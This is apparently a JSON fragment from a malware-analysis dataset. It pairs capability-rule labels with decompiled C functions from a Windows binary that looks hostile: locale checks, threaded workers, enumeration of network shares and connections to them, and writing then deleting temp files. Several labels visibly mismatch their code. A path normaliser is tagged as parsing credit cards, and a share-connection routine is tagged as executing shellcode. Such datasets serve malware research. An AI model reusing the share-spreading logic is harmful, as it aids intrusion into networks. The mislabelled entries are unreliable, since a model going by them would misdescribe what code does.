        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402f7f)\n\nuint fcn.004029f5(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *arg_8h;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t iStack252;\n    int32_t iStack248;\n    uint32_t uStack244;\n    int32_t iStack232;\n    int32_t iStack228;\n    uint *puStack224;\n    int32_t iStack220;\n    int32_t iStack216;\n    int32_t iStack212;\n    int32_t aiStack208 [4];\n    uint uStack192;\n    uint uStack188;\n    int32_t iStack184;\n    int32_t iStack176;\n    int32_t iStack172;\n    uint32_t auStack168 [7];\n    int32_t aiStack140 [34];\n    \n    iStack212 = 0;\n    piVar8 = aiStack208;\n    for (iVar7 = 9; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    iStack228 = 0;\n    puStack224 = NULL;\n    iStack216 = 0;\n    iStack248 = 0;\n    iStack252 = 0;\n    iStack220 = 0;\n    if (*0x40b408 == -0x40b408) {\n        return 0;\n    }\n    iVar7 = fcn.004085d9(*0x40b40c);\n    if (iVar7 != *0x40b430) {\n        return 0;\n    }\n    *0x40b440 = fcn.004062a6(str.Mv2Y);\n    if (*0x40b440 == 0) {\n        return 0;\n    }\n    arg_8h = fcn.00406347(0x31, 0);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    fcn.004094fe(uVar3);\n    if ((*arg_8h & 1) == 0) {\ncode_r0x00402ad4:\n        fcn.00402876();\n        iVar7 = fcn.00406347(0x43, 0);\n        if ((iVar7 != 0) && (iVar5 = fcn.0040271b(iVar7, &iStack212),  iVar5 == 0)) {\n            fcn.00402876();\n        }\n        fcn.004039da(iVar7);\n        iStack172 = fcn.00403e39();\n        if (iStack172 == 0) {\n            uStack188 = uStack192;\n        }\n        iStack252 = fcn.00403772(uStack188, aiStack208[0]);\n        if (iStack252 != 0) {\n            fcn.004028ca(iStack252);\n            puStack224 = fcn.00405930();\n            if (puStack224 == NULL) goto code_r0x00402f01;\n            iStack220 = fcn.00405930();\n            if (iStack220 != 0) {\n                iStack228 = iStack252;\n                if (iStack172 == 0) {\n                    iVar7 = fcn.00404ea5(0);\n                    if (iVar7 != 0) {\n                        if (iStack212 == 0) {\n                            iVar7 = fcn.00404f7a(1);\n                            if ((iVar7 != 0) && (iVar7 = fcn.0040489e(),  iVar7 != 0)) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n                            }\n                            goto code_r0x00402c88;\n                        }\n                        goto code_r0x00402c98;\n                    }\n                    iVar7 = fcn.00404f7a(1);\n                    if (((iVar7 != 0) &&\n                        ((((*arg_8h & 4) == 0 || (iStack212 != 0)) || (iVar7 = fcn.0040242f(),  iVar7 == 0)))) &&\n                       (((*arg_8h & 2) != 0 && (iStack212 == 0)))) {\n                        iVar7 = 0x32;\n                        iVar5 = fcn.00404944();\n                        while (iVar5 != 0) {\n                            iVar7 = iVar7 + -1;\n                            iVar5 = fcn.00404f7a(1);\n                            if (iVar5 == 0) break;\n                            (*_sym.imp.KERNEL32.dll_Sleep)(100);\n                            iVar5 = iVar7;\n                        }\n                    }\n                }\n                else {\n                    iVar7 = fcn.00404ea5(1);\n                    if (iVar7 != 0) {\n                        iVar7 = fcn.00404f7a(0);\n                        if (((iVar7 != 0) && (iStack212 == 0)) && (iVar7 = fcn.004049d3(),  iVar7 != 0)) {\n                            (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n                        }\n                        if (((*arg_8h & 8) != 0) && ((iStack212 == 0 || (aiStack208[2] != 0)))) {\n                            fcn.00404dbe(0x2a);\n                        }\n                        if (((*arg_8h & 0x10) != 0) && ((iStack212 == 0 || (aiStack208[3] != 0)))) {\n                            fcn.00404dbe(0x2b);\n                        }\ncode_r0x00402c88:\n                        if (iStack212 == 0) {\n                            fcn.00402946();\n                            fcn.00401236();\n                        }\ncode_r0x00402c98:\n                        fcn.00404dbe(0x2c);\n                        if ((iStack212 == 0) || (iStack176 == 0)) {\n                            piVar8 = &iStack212;\n                            uVar3 = *arg_8h;\n                            uVar6 = fcn.00403c7a();\n                            iVar7 = fcn.00401894(0, uVar6, uVar3, piVar8);\n                            piVar8 = &iStack212;\n                            uVar3 = *arg_8h;\n                            iStack216 = iVar7;\n                            uVar6 = fcn.00403c7a();\n                            iStack248 = fcn.00401894(1, uVar6, uVar3, piVar8);\n                        }\n                        else {\n                            piVar8 = &iStack212;\n                            uVar3 = *arg_8h;\n                            uVar6 = fcn.00403c7a();\n                            iVar7 = fcn.00401894(1, uVar6, uVar3, piVar8);\n                            iStack216 = iVar7;\n                        }\n                        if (iVar7 != 0) {\n                            aiStack140[1] = fcn.004024c2(fcn.004022ee, 0, 0, 0, iStack252, puStack224);\n                            uStack244 = aiStack140[1] != 0;\n                            uVar4 = aiStack140[1] != 0;\n                            if (iStack212 == 0) {\n                                iVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040239a, &iStack228, 0, 0);\n                                aiStack140[uVar4 + 1] = iVar5;\n                                uStack244 = uVar4;\n                                if (iVar5 == 0) goto code_r0x00402eec;\n                                uStack244 = uVar4 + 1;\n                                if (iStack184 != 0) {\n                                    iVar5 = fcn.004024c2(fcn.00401bbf, iVar7, iStack248, iStack184, iStack252, \n                                                         puStack224);\n                                    aiStack140[uVar4 + 2] = iVar5;\n                                    if (iVar5 != 0) {\n                                        uStack244 = uVar4 + 2;\n                                    }\n                                }\n                                iVar5 = fcn.004024c2(fcn.00402161, iVar7, iStack248, 0, iStack252, iStack220);\n                                aiStack140[uStack244 + 1] = iVar5;\n                                if (iVar5 != 0) {\n                                    uStack244 = uStack244 + 1;\n                                }\n                                iStack232 = fcn.004024c2(fcn.00401a76, iVar7, iStack248, 0, iStack252, puStack224);\n                                iVar7 = fcn.004024c2(fcn.00401cc5, iVar7, iStack248, 0, iStack252, puStack224);\n                                aiStack140[uStack244 + 1] = iVar7;\n                                if (iVar7 != 0) {\n                                    uStack244 = uStack244 + 1;\n                                }\n                            }\n                            else {\n                                iStack232 = fcn.004024c2(fcn.00401bbf, iVar7, iStack248, iStack184, iStack252, \n                                                         puStack224);\n                            }\n                            if (iStack232 != 0) {\n                                (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iStack232, 0xffffffff);\n                            }\n                            iVar7 = fcn.00405962();\n                            if (iVar7 == 0) {\n                                if ((iStack212 == 0) || (aiStack208[1] != 0)) {\n                                    fcn.00401000();\n                                }\n                                if (iStack212 == 0) {\n                                    fcn.00402946();\n                                }\n                                if (((*arg_8h & 8) != 0) &&\n                                   (((iStack212 == 0 || (aiStack208[2] != 0)) && (iStack172 != 0)))) {\n                                    fcn.00404dbe(0x2a);\n                                }\n                            }\n                            puVar2 = puStack224;\n                            if (iStack212 != 0) {\n                                puVar1 = puStack224 + 1;\n                                (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n                                *puVar2 = 1;\n                                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n                            }\n                            if (uStack244 != 0) {\n                                (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)\n                                          (uStack244, aiStack140 + 1, 1, 0xffffffff);\n                            }\n                            if (iStack232 == 0) goto code_r0x00402eec;\n                            while( true ) {\n                                (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack232);\ncode_r0x00402eec:\n                                if (uStack244 == 0) break;\n                                iStack232 = aiStack140[uStack244];\n                                uStack244 = uStack244 - 1;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    else {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(0x800, 0x58, auStack168, 0x20);\n        if (iVar7 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = auStack168[0] >> 9 & 1;\n        }\n        if (uVar4 == 0) goto code_r0x00402ad4;\n    }\n    if (puStack224 != NULL) {\n        fcn.0040597e();\n    }\ncode_r0x00402f01:\n    if (iStack220 != 0) {\n        fcn.0040597e();\n    }\n    if (iStack252 != 0) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iStack252);\n        if (*(iStack252 + 0x1c) != -1) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(*(iStack252 + 0x1c));\n        }\n        if (*(iStack252 + 0x18) != -1) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(*(iStack252 + 0x18));\n        }\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(iStack252);\n        fcn.004090a1(iStack252);\n    }\n    fcn.00402876();\n    fcn.004039b7(arg_8h, 4);\n    if (iStack216 != 0) {\n        fcn.00401870();\n    }\n    if (iStack248 != 0) {\n        fcn.00401870();\n    }\n    fcn.00406274();\n    return 0;\n}\n",
        "token_count": 2841
    },
    "00403848": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403848(uint lpWideCharStr)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    uint lpNumberOfBytesWritten;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.004090c6(lpWideCharStr);\n    var_8h = iVar1;\n    if (*(unaff_ESI + 0x1c) != -1) {\n        uVar2 = fcn.004090c6(lpWideCharStr, &lpNumberOfBytesWritten, 0);\n        var_4h = (*_sym.imp.KERNEL32.dll_WriteConsoleW)(*(unaff_ESI + 0x1c), lpWideCharStr, uVar2);\n    }\n    if (*(unaff_ESI + 0x18) != -1) {\n        iVar1 = fcn.00409041(iVar1 * 2 + 2);\n        if (iVar1 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, lpWideCharStr, var_8h, iVar1, var_8h, 0, 0);\n            *(iVar3 + iVar1) = 0;\n            uVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(unaff_ESI + 0x18), iVar1, iVar3, &lpNumberOfBytesWritten, 0);\n            var_4h = var_4h & uVar4;\n            fcn.004090a1(iVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 394
    },
    "00403969": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403969(uint lpFileName, uint lpBuffer)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t unaff_EBX;\n    bool bVar3;\n    uint lpNumberOfBytesWritten;\n    \n    bVar3 = false;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x40000000, 0, 0, 2, 0, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1, lpBuffer);\n        bVar3 = iVar2 != 0 && in_ECX == unaff_EBX;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return bVar3;\n}\n",
        "token_count": 187
    },
    "0040454b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040454b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint uStack660;\n    int32_t iStack652;\n    uint uStack648;\n    int32_t iStack644;\n    int32_t iStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    int32_t iStack624;\n    uint uStack620;\n    int32_t iStack616;\n    uint uStack612;\n    int32_t iStack608;\n    uint uStack604;\n    uint uStack600;\n    uchar auStack592 [24];\n    uchar auStack568 [20];\n    uchar auStack548 [544];\n    \n    iStack652 = fcn.00406347(0x25, auStack592);\n    iStack608 = iStack652;\n    iVar1 = fcn.004090b5(iStack652);\n    iStack652 = iVar1 + 1 + iStack652;\n    uStack604 = 0;\n    arg_8h_00 = fcn.00403c7a();\n    iVar1 = fcn.00406347(0x23, &iStack644);\n    iVar2 = fcn.004090c6(iVar1);\n    uStack636 = 0;\n    uStack648 = 0x10;\n    iVar2 = fcn.00403a18(0x80000002, iVar1, iVar1 + 2 + iVar2 * 2, auStack568);\n    if (iVar2 != 0) {\n        uStack636 = fcn.004094d9(auStack568, 0, 10);\n    }\n    fcn.004039b7(iVar1, iStack644);\n    iStack640 = 0;\n    uStack628 = 0;\n    uStack620 = fcn.00403bb3(0x18);\n    uStack648 = fcn.00406347(0x16, 0);\n    iStack644 = fcn.00406347(0x26, 0);\n    iStack616 = fcn.00403bb3(0x1f);\n    iStack624 = fcn.00409041(0x209);\n    uStack612 = 0;\n    uStack600 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iStack608, iStack652);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    fcn.00405a46();\n    fcn.00403d4b(&iStack608, 0);\n    if (uStack612 < 6) goto code_r0x0040482a;\n    iVar1 = fcn.00404428();\n    if (iVar1 == 0) goto code_r0x0040482a;\n    iVar1 = fcn.004043cc();\n    if (iVar1 != 5) goto code_r0x0040482a;\n    iVar1 = fcn.00405b0e(uStack636);\n    if (iVar1 == 0) goto code_r0x0040482a;\n    iVar1 = fcn.004059f1(auStack548, 0x104, 2);\n    if (iVar1 == 0) goto code_r0x0040482a;\n    if (pcVar4 == NULL) {\ncode_r0x004046fc:\n        iVar1 = 0;\n    }\n    else {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&iStack624);\n        iVar1 = (*pcVar4)(uVar3);\n        if ((iVar1 == 0) || (iVar1 = 1,  iStack624 == 0)) goto code_r0x004046fc;\n    }\n    iStack640 = fcn.00406347(0x30 - (iVar1 != 0), &iStack652);\n    if (iStack640 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(auStack548, 0x40000000, 0, 0, 2, 0, 0);\n        pcVar4 = _sym.imp.KERNEL32.dll_WriteFile;\n        if (iVar2 != -1) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, iStack640, iStack652, &iStack644, 0);\n            if ((iVar5 != 0) && (iStack644 == iStack652)) {\n                iVar5 = (*pcVar4)(iVar2, uStack636, 0x208, &iStack644, 0);\n                if ((iVar5 != 0) && (iStack644 == 0x208)) {\n                    (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(iVar2);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n                    iVar2 = fcn.00403ee1(uStack628);\n                    if (iVar2 != 0) {\n                        iVar2 = fcn.00404325(auStack548, 0, iVar1, uStack648);\n                        if (iVar2 != 0) {\n                            iStack616 = fcn.00403e9e(arg_8h_00, uStack660);\n                            if (iStack616 != 0) {\n                                (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(arg_8h, 0xffffffff);\n                            }\n                            fcn.00404325(0, 1, iVar1, uStack648);\n                            fcn.00403ee1(uStack636);\n                            (*_sym.imp.KERNEL32.dll_DeleteFileW)(auStack548);\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0040482a:\n    fcn.00403d4b(iStack608, 1);\n    fcn.004039da(uStack628);\n    fcn.004039b7(iStack640, iStack652);\n    fcn.00408fa9(auStack548, 0, 0x20a);\n    fcn.004039da(uStack632);\n    fcn.004039b7(uStack620, uStack604);\n    fcn.004039da(arg_8h_00);\n    fcn.004039da(uStack660);\n    return iStack616;\n}\n",
        "token_count": 1442
    },
    "004034eb": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004034eb(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *unaff_EDI;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar2 = *(unaff_EDI[9] + 0x10);\n    uVar3 = *(unaff_EDI[9] + 0x14);\n    if ((*(unaff_EDI + 10) & 5) == 0) {\n        iVar5 = fcn.00403246(&var_8h, 4);\n        if (iVar5 != 0) {\n            iVar5 = fcn.00403246(arg_8h, var_8h);\n            if (iVar5 != 0) {\n                piVar1 = unaff_EDI + 0xb;\n                *piVar1 = *piVar1 + -1;\n                pcVar4 = _sym.imp.KERNEL32.dll_SetEvent;\n                if (*piVar1 == 0) {\n                    unaff_EDI[10] = unaff_EDI[10] | 4;\n                    (*_sym.imp.KERNEL32.dll_ResetEvent)(unaff_EDI[1]);\n                    (*pcVar4)(unaff_EDI[2]);\n                }\n                if ((uVar2 < uVar3 >> 2) && (unaff_EDI[0xd] <= uVar3 >> 1)) {\n                    fcn.004031c3();\n                }\n                if ((unaff_EDI[10] & 2) != 0) {\n                    unaff_EDI[10] = unaff_EDI[10] & 0xfffffffd;\n                    (*pcVar4)(*unaff_EDI);\n                }\n                var_4h = 1;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 440
    },
    "00403a18": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403a18(uint hKey, uint lpSubKey, uint lpValueName, uint lpData)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    uint lpType;\n    uint phkResult;\n    uint32_t lpcbData;\n    uint var_4h;\n    \n    lpcbData = *unaff_ESI * 2 + 2;\n    var_4h = 0;\n    lpType = 1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, lpSubKey, 0, 0x20119, &phkResult);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(phkResult, lpValueName, 0, &lpType, lpData, &lpcbData);\n        if ((iVar1 == 0) || (iVar1 == 0xea)) {\n            var_4h = 1;\n            *unaff_ESI = (lpcbData >> 1) - 1;\n        }\n        else {\n            var_4h = 0;\n            *unaff_ESI = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    }\n    return var_4h;\n}\n",
        "token_count": 300
    },
    "00401e10": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401e10(uint arg_8h, int32_t arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint auStack12 [2];\n    \n    iStack24 = -1;\n    iStack16 = 0;\n    auStack12[0] = 0x4000;\n    iVar1 = fcn.00409041(0x4000);\n    iStack20 = fcn.00409041(0x10000);\n    if (iVar1 != 0) {\n        if (iStack20 != 0) {\n            iVar2 = (*_sym.imp.MPR.dll_WNetOpenEnumW)(arg_8h, 0, 0, arg_ch, &iStack16);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.MPR.dll_WNetEnumResourceW)(iStack16, &iStack24, iVar1, auStack12);\n                while ((iVar2 == 0 && (iVar2 = fcn.00405962(),  iVar2 == 0))) {\n                    while (iStack24 != 0) {\n                        iStack24 = iStack24 + -1;\n                        iVar2 = iStack24 * 0x20 + iVar1;\n                        if ((*(iVar2 + 0xc) & 2) == 0) {\n                            if (((*(iVar2 + 4) & 1) != 0) && (uVar3 = fcn.004090c6(*(iVar2 + 0x14)),  uVar3 < 0x8008)) {\n                                iVar2 = fcn.00409216(*(iStack24 * 0x20 + 0x14 + iVar1), L\"\\\\\\\\?\\\\UNC\\\\\\\\\\\\e-\", 8);\n                                if (iVar2 == 0) {\n                                    piVar6 = *(iStack24 * 0x20 + 0x14 + iVar1);\n                                    iVar2 = iStack20;\n                                }\n                                else {\n                                    for (piVar6 = *(iStack24 * 0x20 + 0x14 + iVar1); *piVar6 == 0x5c;\n                                        piVar6 = piVar6 + 1) {\n                                    }\n                                    fcn.00408fd7(iStack20, L\"\\\\\\\\?\\\\UNC\\\\\\\\\\\\e-\", 0x10);\n                                    iVar2 = iStack20 + 0x10;\n                                }\n                                fcn.0040927d(iVar2, piVar6);\n                                iVar2 = fcn.00403711(iStack20);\n                                if (iVar2 < 0) {\n                                    fcn.004035d2(arg_14h);\n                                    uVar9 = arg_10h[4];\n                                    uVar8 = arg_10h[3];\n                                    uVar7 = *arg_10h;\n                                    uVar5 = arg_18h;\n                                    uVar4 = fcn.00403c7a();\n                                    uVar4 = fcn.00401706(uVar4);\n                                    iVar2 = fcn.00405840(uVar4, uVar7, uVar8, uVar9, uVar5);\n                                    if (iVar2 != 0) {\n                                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n                                    }\n                                    iVar2 = arg_10h[1];\n                                    if (iVar2 != 0) {\n                                        uVar9 = arg_10h[4];\n                                        uVar8 = arg_10h[3];\n                                        uVar7 = arg_18h;\n                                        uVar5 = fcn.00403c7a();\n                                        uVar5 = fcn.00401706(uVar5);\n                                        iVar2 = fcn.00405840(uVar5, iVar2, uVar8, uVar9, uVar7);\n                                        if (iVar2 != 0) {\n                                            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                        else if ((arg_1ch != 0) &&\n                                ((arg_ch == 0 ||\n                                 (((*(arg_ch + 0x14) != 0 && (*(iVar2 + 0x14) != 0)) &&\n                                  (iVar2 = fcn.004090dd(*(arg_ch + 0x14), *(iVar2 + 0x14)),  iVar2 != 0)))))) {\n                            fcn.00401e10(arg_8h, iStack24 * 0x20 + iVar1, arg_10h, arg_14h, arg_18h, arg_1ch + -1);\n                        }\n                    }\n                    iStack24 = -1;\n                    auStack12[0] = 0x4000;\n                    iVar2 = (*_sym.imp.MPR.dll_WNetEnumResourceW)(iStack16, &iStack24, iVar1, auStack12);\n                }\n            }\n            if (iStack16 != 0) {\n                (*_sym.imp.MPR.dll_WNetCloseEnum)(iStack16);\n            }\n        }\n        fcn.004090a1(iVar1);\n    }\n    if (iStack20 != 0) {\n        fcn.004090a1(iStack20);\n    }\n    return 0;\n}\n",
        "token_count": 1235
    },
    "004033f3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004033f3(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *unaff_EDI;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = *(unaff_EDI[9] + 0x14);\n    uVar3 = uVar2 - *(unaff_EDI[9] + 0x10);\n    iVar1 = fcn.004090c6(arg_8h);\n    var_4h = iVar1 * 2 + 6;\n    if ((*(unaff_EDI + 10) & 1) != 0) {\n        return 0;\n    }\n    if (uVar3 < var_4h) {\n        for (; uVar3 = uVar3 + uVar2,  uVar3 < var_4h; uVar2 = uVar2 * 2) {\n        }\n        if ((unaff_EDI[0xc] <= uVar2 && uVar2 != unaff_EDI[0xc]) || (iVar1 = fcn.004031c3(),  iVar1 == 0)) {\n            unaff_EDI[10] = unaff_EDI[10] | 2;\n            (*_sym.imp.KERNEL32.dll_ResetEvent)(*unaff_EDI);\n            return 0;\n        }\n    }\n    var_4h = var_4h - 4;\n    fcn.004031e1(&var_4h, 4);\n    fcn.004031e1(arg_8h, var_4h);\n    unaff_EDI[0xb] = unaff_EDI[0xb] + 1;\n    if ((unaff_EDI[10] & 4) != 0) {\n        unaff_EDI[10] = unaff_EDI[10] & 0xfffffffb;\n        (*_sym.imp.KERNEL32.dll_SetEvent)(unaff_EDI[1]);\n        (*_sym.imp.KERNEL32.dll_ResetEvent)(unaff_EDI[2]);\n    }\n    return var_4h;\n}\n",
        "token_count": 476
    },
    "0040349e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040349e(uint arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    puVar1 = in_EAX + 3;\n    while( true ) {\n        (*pcVar2)(puVar1);\n        iVar3 = fcn.004033f3(arg_8h);\n        if ((iVar3 != 0) || ((*(in_EAX + 10) & 1) != 0)) break;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*in_EAX, 0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n    return iVar3;\n}\n",
        "token_count": 209
    },
    "00402084": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00402084(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iStack592;\n    ushort uStack588;\n    ushort uStack586;\n    uint uStack584;\n    ushort uStack580;\n    ushort uStack578;\n    ushort uStack576;\n    ushort uStack574;\n    uchar *puStack568;\n    uint auStack564 [2];\n    uchar auStack556 [20];\n    uchar auStack536 [4];\n    uchar auStack532 [528];\n    \n    uStack580 = 0;\n    uStack578 = 0;\n    uStack576 = 0;\n    uStack574 = 0;\n    puStack568 = NULL;\n    puVar2 = auStack564;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    uStack586 = 0;\n    uStack588 = 2;\n    iStack592 = 0x102;\n    uStack584 = arg_8h;\n    fcn.00408fd7(auStack536, 0x40a3a8, 4);\n    iStack592 = iStack592 + -2;\n    iVar1 = (*_sym.imp.WS2_32.dll_WSAAddressToStringW)(&uStack588, 0x10, 0, auStack532, &iStack592);\n    if (iVar1 == 0) {\n        puStack568 = auStack556;\n        uStack588 = 2;\n        uStack586 = 0;\n        uStack576 = 2;\n        uStack574 = 0;\n        iVar1 = (*_sym.imp.MPR.dll_WNetUseConnectionW)(0, &uStack588, 0, 0, 0, 0, 0, &iStack592);\n        if (iVar1 == 0) {\n            fcn.00401e10(2, &uStack588, *arg_ch, arg_ch[1], arg_ch[2], 0x80);\n        }\n    }\n    iVar1 = fcn.00405962();\n    return iVar1 == 0;\n}\n",
        "token_count": 511
    },
    "00405bf7": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405bf7(int16_t *param_1)\n\n{\n    bool bVar1;\n    ushort *in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = fcn.004090c6(param_1);\n    if (3 < uVar2) {\n        if ((((*param_1 == 0x5c) && (param_1[1] == 0x5c)) && (param_1[2] == 0x3f)) && (param_1[3] == 0x5c)) {\n            param_1 = param_1 + 4;\n            uVar2 = uVar2 - 4;\n        }\n        if ((((3 < uVar2) && ((*param_1 == 0x55 || (*param_1 == 0x75)))) &&\n            ((param_1[1] == 0x4e || (param_1[1] == 0x6e)))) &&\n           (((param_1[2] == 0x43 || (param_1[2] == 99)) && (param_1[3] == 0x5c)))) {\n            bVar1 = true;\n            param_1 = param_1 + 4;\n            uVar2 = uVar2 - 2;\n            goto code_r0x00405c6e;\n        }\n    }\n    bVar1 = false;\ncode_r0x00405c6e:\n    if (uVar2 < 0x7fff) {\n        if (bVar1) {\n            *in_EAX = 0x5c;\n            in_EAX[1] = 0x5c;\n            in_EAX = in_EAX + 2;\n        }\n        fcn.0040927d(in_EAX, param_1);\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 422
    },
    "004028ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004028ca(uint arg_8h)\n\n{\n    int32_t arg_ch;\n    uint var_2ch;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    fcn.00403c7a();\n    var_8h = fcn.00406347(0x33, 0);\n    var_14h = &var_2ch;\n    var_18h = 0x40a20c;\n    var_10h = 0;\n    var_ch = 0;\n    arg_ch = 0;\n    fcn.00405a46();\n    if (var_8h != 0) {\n        arg_ch = fcn.00405fe7(var_8h, &var_18h);\n        if (arg_ch != 0) {\n            fcn.00403940(arg_8h, arg_ch);\n        }\n    }\n    fcn.004039da(var_8h);\n    fcn.004039da(arg_ch);\n    return;\n}\n",
        "token_count": 245
    },
    "00408fa9": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
